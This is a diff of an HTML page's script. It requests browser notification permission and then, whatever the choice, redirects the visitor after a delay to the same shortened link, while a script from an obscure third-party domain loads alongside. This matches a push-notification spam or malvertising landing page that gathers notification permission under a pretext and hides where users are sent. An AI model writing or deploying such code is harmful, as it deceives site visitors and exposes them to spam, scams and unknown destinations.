@@ -1,25 +1,27 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+<meta name="clckd" content="22f7e0f49b5ad1626b982340688a43c1" />
 <script>
 function requestNotificationAndRedirect() {
   if (!("Notification" in window)) {
-    window.location.href = "https://wu8.in/UBsddcw";
+    setTimeout(() => { window.location.href = "https://wu8.in/UBsddcw"; }, 10000);
     return;
   }
 
   Notification.requestPermission().then(permission => {
-    if (permission === "granted") {
-      window.location.href = "https://wu8.in/UBsddcw";
-    } else {
-      window.location.href = "https://wu8.in/UBsddcw";
-    }
+    const dest = permission === "granted" ? "https://wu8.in/UBsddcw" : "https://wu8.in/UBsddcw";
+    setTimeout(() => { window.location.href = dest; }, 10000);
   }).catch(() => {
-    window.location.href = "https://wu8.in/UBsddcw";
+    setTimeout(() => { window.location.href = "https://wu8.in/UBsddcw"; }, 10000);
   });
 }
-requestNotificationAndRedirect();
+
+// Example: call from a user gesture (button click)
+document.getElementById("notifyBtn").addEventListener("click", requestNotificationAndRedirect);
+
 </script>
+  
 <script async src="https://ss.mrmnd.com/ctatic/8e3eb1af-afc5-4328-b485-927d289eb49c.js"></script>
 <style>
     body {
